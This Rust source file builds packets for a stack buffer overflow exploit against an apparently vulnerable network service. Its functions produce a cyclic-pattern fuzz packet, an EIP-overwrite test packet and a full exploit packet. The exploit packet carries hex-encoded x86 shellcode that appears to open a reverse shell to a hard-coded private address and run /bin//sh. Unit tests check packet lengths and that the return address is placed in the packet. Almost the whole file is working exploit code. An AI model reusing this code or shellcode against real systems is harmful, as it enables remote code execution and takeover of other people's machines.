use std::iter::repeat;

pub fn generate_fuzz_packet() -> Vec<u8> {

    let length: u32 = 2000;
    let offset_pattern: &str = "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngA";

    let mut data: Vec<u8> = Vec::new();
    data.extend(length.to_le_bytes());
    data.extend(offset_pattern.as_bytes());

    data
}

pub fn generate_overwrite_eip_packet() -> Vec<u8> {
    let length: u32 = 2000;
    let bytes_until_eip: String = repeat('A').take(1040).collect();
    let overwritten_instruction_pointer_eip: u32 = 0xdeadbeef;
    let payload: String = repeat('Z').take(200).collect();

    let mut data: Vec<u8> = Vec::new();
    data.extend(length.to_le_bytes());
    data.extend(bytes_until_eip.as_bytes());
    data.extend(overwritten_instruction_pointer_eip.to_le_bytes());
    data.extend(payload.as_bytes());

    data
}


pub fn generate_exploit_packet(return_address: u32) -> Vec<u8>{
    let length: u32 = 2000;
    let bytes_until_eip: String = repeat('A').take(1040).collect();
    let overwritten_instruction_pointer_eip: u32 = return_address;
    let payload = hex::decode("31dbf7e35343536a0289e1b066cd809359b03fcd804979f9680a00010a68020015b389e1b066505153b30389e1cd8052686e2f7368682f2f626989e3525389e1b00bcd80").unwrap();

    let mut data: Vec<u8> = Vec::new();
    data.extend(length.to_le_bytes());
    data.extend(bytes_until_eip.as_bytes());
    data.extend(overwritten_instruction_pointer_eip.to_le_bytes());
    data.extend(payload.as_slice());

    data
}

#[cfg(test)]
mod tests {
    use crate::{generate_exploit_packet, generate_fuzz_packet, generate_overwrite_eip_packet};

    #[test]
    fn it_generates_a_fuzz_packet() {
        let packet = generate_fuzz_packet(); 
        assert_eq!(packet.len(), 1104);
    }

    #[test]
    fn it_generates_an_eip_packet() {
        let packet = generate_overwrite_eip_packet(); 
        assert_eq!(packet.len(), 1248);
    }

    #[test]
    fn it_generates_an_exploit_packet() {
        let packet = generate_exploit_packet(0x123456); 
        assert_eq!(packet.len(), 1116);
    }

    #[test]
    fn it_generates_an_exploit_packet_containing_ret_address() {
        let ret_address: u32 = 0xdeadbeef;
        let packet = generate_exploit_packet(ret_address); 
        assert_eq!(packet.windows(4).any(|window| window == ret_address.to_le_bytes()), true);

        //assert_eq!(packet.contains(ret_address. to_le_bytes()), true);
    }
}
